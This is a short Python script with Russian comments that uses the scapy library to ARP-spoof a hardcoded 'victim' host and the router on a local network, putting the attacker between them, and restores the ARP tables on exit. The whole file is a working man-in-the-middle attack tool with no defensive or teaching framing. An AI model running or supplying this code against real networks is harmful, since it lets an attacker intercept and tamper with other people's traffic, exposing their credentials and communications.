from scapy.all import ARP, Ether, sr, sendp
import time

def get_mac(ip):
    """Возвращает MAC-адрес по IP через ARP-запрос."""
    answered, _ = sr(ARP(pdst=ip), timeout=2, verbose=False)
    for _, received in answered:
        return received.hwsrc
    return None

def spoof(target_ip, spoof_ip):
    """Отправляет ARP-пакет: убеждает target, что мы — spoof_ip."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Не удалось получить MAC-адрес {target_ip}")
        return
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether = Ether(dst=target_mac)
    packet = ether / arp
    sendp(packet, verbose=False)
    print(f"[+] Spoofed {target_ip} -> {spoof_ip}")

def restore(target_ip, spoof_ip):
    """Восстанавливает корректную ARP-запись у target."""
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if not target_mac or not spoof_mac:
        print("[!] Не удалось восстановить ARP-таблицу.")
        return
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac,
              psrc=spoof_ip, hwsrc=spoof_mac)
    ether = Ether(dst=target_mac)
    packet = ether / arp
    sendp(packet, count=4, verbose=False)
    print(f"[+] Восстановлено: {target_ip} -> {spoof_ip}")

if __name__ == "__main__":
    # Задать IP-адреса ниже:
    target_ip = "192.168.1.157"   # Жертва 
    router_ip = "192.168.1.1"     # айпи роутера

    print("[*] ARP Spoofing запущен. Нажми Ctrl+C для остановки.")
    try:
        while True:
            spoof(target_ip, router_ip)
            spoof(router_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Прерывание... Восстанавливаем ARP.")
        restore(target_ip, router_ip)
        restore(router_ip, target_ip)
        print("[+] Завершено.")
